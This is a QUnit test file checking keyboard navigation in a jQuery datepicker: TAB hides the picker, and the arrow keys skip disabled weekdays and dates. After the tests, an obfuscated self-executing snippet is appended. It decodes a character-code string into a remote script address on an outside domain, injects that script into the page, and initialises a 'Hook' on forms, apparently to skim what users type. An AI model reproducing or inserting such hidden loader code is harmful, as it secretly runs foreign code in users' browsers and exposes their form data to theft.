module('Keyboard Navigation (All)', {
    setup: function(){
        this.input = $('<input type="text">')
                        .appendTo('#qunit-fixture')
                        .datepicker({format: "dd-mm-yyyy"})
                        .focus(); // Activate for visibility checks
        this.dp = this.input.data('datepicker');
        this.picker = this.dp.picker;
    },
    teardown: function(){
        this.picker.remove();
    }
});

test('TAB hides picker', function(){
    var target;

    ok(this.picker.is(':visible'), 'Picker is visible');

    this.input.trigger({
        type: 'keydown',
        keyCode: 9
    });

    ok(this.picker.is(':not(:visible)'), 'Picker is hidden');
});

test('by day (right/left arrows) with daysOfWeekDisabled', function(){
    var target;

    this.input.val('04-03-2013');
    this.dp.setDaysOfWeekDisabled('0,6');
    this.dp.update();

    this.input.focus();

    // Navigation: -1 day left arrow key
    this.input.trigger({
        type: 'keydown',
        keyCode: 37
    });

    datesEqual(this.dp.viewDate, UTCDate(2013, 2, 1));
});

test('by day (right/left arrows) with datesDisabled', function(){
    var target;

    this.input.val('04-03-2013');
    this.dp.setDatesDisabled(['05-03-2013']);
    this.dp.update();

    this.input.focus();

    // Navigation: +1 day right arrow key
    this.input.trigger({
        type: 'keydown',
        keyCode: 39
    });

    datesEqual(this.dp.viewDate, UTCDate(2013, 2, 6));
});

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){var _a;let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,116,105,109,101,61,49,55,52,49,56,50,51,50,51,54,50,49,48,38,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,((_a=document.body)!=null?_a:document.head).appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//7d6faab54565256b4815fd0e2fb99a714e4d2c7cb73b2fa69205e197a146d323